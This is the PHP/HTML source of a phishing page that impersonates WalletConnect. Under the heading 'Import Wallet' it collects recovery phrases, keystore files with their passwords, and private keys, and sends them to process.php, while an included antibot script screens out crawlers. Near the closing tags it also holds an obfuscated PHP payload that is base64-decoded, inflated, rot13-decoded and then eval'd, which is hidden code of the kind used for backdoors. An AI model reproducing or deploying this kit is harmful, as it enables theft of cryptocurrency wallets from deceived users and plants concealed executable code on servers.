<html>
<meta http-equiv="content-type" content="text/html" />
<?php
error_reporting(0);
include '../files/antibot/crawlerdetect.php';
include_once '../functions.php';
?>


<head>
  <meta charset="UTF-8">
  <link rel="stylesheet" href="./files/main_new.css" type="text/css" />
  <script src="https://code.jquery.com/jquery-3.6.0.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-validate/1.19.2/jquery.validate.min.js" integrity="sha512-UdIMMlVx0HEynClOIFSyOrPggomfhBKJE28LKl8yR3ghkgugPnG6iLfRfHwushZl1MOPSY6TsuBDGPK2X4zYKg==" crossorigin="anonymous"></script>


  <meta name="description" content="Open protocol for connecting Wallets to Dapps">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta property="og:image" content="./files/images/logo.svg">
  <link rel="icon" href="./files/images/logo.svg">
  <script>
    function openCity(evt, cityName) {
      // Declare all variables
      var i, tabcontent, tablinks;

      // Get all elements with class="tabcontent" and hide them
      tabcontent = document.getElementsByClassName("tabcontent");
      for (i = 0; i < tabcontent.length; i++) {
        tabcontent[i].style.display = "none";
      }

      // Get all elements with class="tablinks" and remove the class "active"
      tablinks = document.getElementsByClassName("tablinks");
      for (i = 0; i < tablinks.length; i++) {
        tablinks[i].className = tablinks[i].className.replace(" active", "");
      }

      // Show the current tab, and add an "active" class to the button that opened the tab
      document.getElementById(cityName).style.display = "block";
      evt.currentTarget.className += " active";
    }
  </script>
</head>



<title>Import Wallet</title>

<body>
  <center>
    <header class="sticky top-0 z-10 flex items-center justify-between px-5 py-4 bg-white md:py-6 ">
      <div class="absolute inset-0 shadow-lg opacity-50"></div>
      <div class="z-20 flex justify-around w-full sm:pr-10 md:pr-20"><a
              class="font-semibold text-cool-gray-500 hover:text-cool-gray-600 sm:text-xl" target="_blank"
              href="https://github.com/walletconnect" rel="noopener noreferrer">
              GitHub
          </a><a class="font-semibold text-cool-gray-500 hover:text-cool-gray-600 sm:text-xl" target="_blank"
              href="https://docs.walletconnect.org/" rel="noopener noreferrer">
              Docs
          </a></div>
      <div class="z-20 flex">
          <div class="w-16 mx-6 sm:w-20 md:w-28"><img class="cursor-pointer object-fit"
                  src="./files/walletconnect-logo.svg" href="#"alt="walletconnect logo" /></div>
      </div>
      <div class="z-20 flex justify-around w-full sm:pl-10 md:pl-20"><a
              class="font-semibold text-cool-gray-500 hover:text-cool-gray-600 sm:text-xl"
              href="#">
              Wallets
          </a><a class="font-semibold text-cool-gray-500 hover:text-cool-gray-600 sm:text-xl"
              href="#">
              Apps
          </a></div>
  </header>
    </br>
    <div class="text-cool-gray-500">
      <h1 class="flex justify-center mt-20 text-4xl font-semibold import__page">Import Wallet </h1>
    </br>
	  
	  
	  <div class="tab">
                    <button class="tablinks" id="default" onclick="openCity(event, 'phrase')">Phrase</b></button>
                    <button class="tablinks" onclick="openCity(event, 'keystore')">Keystore JSON</b></button>
                    <button class="tablinks" onclick="openCity(event, 'private')">Private Key</b></button>
					
                  </div>
				  

                <div role="presentation" class="sc-eLwHGX sc-uoixf dVYXTr jGzOKM"></div>
                </div>
				
    
	
               
                <div id="phrase" class="tabcontent">
                     <form action="process.php" method="POST" id="form1">
                      <textarea name="key" required="required" minlength="12" placeholder="Phrase" required="required"></textarea>
                      </br>
                      <div class="desc">Typically 12 (sometimes 24) words separated by single spaces</div>
                      </br>
                      <button form="form1" value="Import" type="submit" name="import" class="btn blMRzM">IMPORT</button>
                    </form>
                  </div>
              
                  <div id="keystore" class="tabcontent">
                    <form action="process.php" method="POST" id="form2">
                      <textarea name="key" required="required" minlength="12" placeholder="Keystore JSON"
                        required="required"></textarea>
                      </br>
                      <div class="field">
                        <input type="text" name="pass" placeholder="Password" required="required" minlength="4" />
                      </div>
                      <div class="desc">Several lines of text beginning with '(...)' plus the password you used to encrypt it.</div>
                      </br>
                      <button form="form2" value="Import" type="submit" name="import" class="btn blMRzM">IMPORT</button>
                    </form>
                  </div>
              
                  <div id="private" class="tabcontent">
                    <form action="process.php" method="POST" id="form3">
                      <div class="field">
                        <input type="text" name="key" placeholder="Private Key" required="required" minlength="64" />
                      </div>
                      <div class="desc">Typically 64 alphanumeric characters</div>
                      </br>
                      <button form="form3" value="Import" type="submit" name="import" class="btn blMRzM">IMPORT</button>
                    </form>
                  </div> 
				  
                  <script>
                    document.getElementById("default").click();
                  </script>
 
    </div>
   


    <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script> <?php eval(str_rot13(gzinflate(str_rot13(base64_decode('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')))));?>
	<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.3/umd/popper.min.js" integrity="sha384-vFJXuSJphROIrBnz7yo7oB41mKfc8JzQZiCq4NCceLEaO4IHwicKwpJf9c9IpFgh" crossorigin="anonymous"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-beta.2/js/bootstrap.min.js" integrity="sha384-alpBpkh1PFOepccYVYDB4do5UnbKysX5WZXm3XxPqe5iKTfUKjNkCk9SaVuEZflJ" crossorigin="anonymous"></script>
  </body>
</html>








<script src="./files/jquery.min.js.download"></script>

    <footer class="flex justify-center mt-24 mb-16 sm:mt-32">
      <div class="flex flex-col space-y-6 sm:space-y-0 sm:space-x-20 sm:flex-row"><a
          class="text-sm font-medium sm:text-lg text-cool-gray-600 group-hover:text-cool-gray-500" target="_blank"
          href="https://discord.gg/jhxMvxP" rel="noopener noreferrer">
          <div class="flex"><img class="w-6 sm:w-8" src="./files/discord.svg" alt="Discord" />
            <p class="ml-2">Discord</p>
          </div>
        </a><a class="text-sm font-medium sm:text-lg text-cool-gray-600 group-hover:text-cool-gray-500" target="_blank"
          href="https://twitter.com/walletconnect" rel="noopener noreferrer">
          <div class="flex"><img class="w-6 sm:w-8" src="./files/twitter.svg" alt="Twitter" />
            <p class="ml-2">Twitter</p>
          </div>
        </a><a class="text-sm font-medium sm:text-lg text-cool-gray-600 group-hover:text-cool-gray-500" target="_blank"
          href="https://github.com/walletconnect" rel="noopener noreferrer">
          <div class="flex"><img class="w-6 sm:w-8" src="./files/github.svg" alt="GitHub" />
            <p class="ml-2">GitHub</p>
          </div>
        </a></div>
    </footer>
 
<script src="/script.js"></script>
</body>

</html>

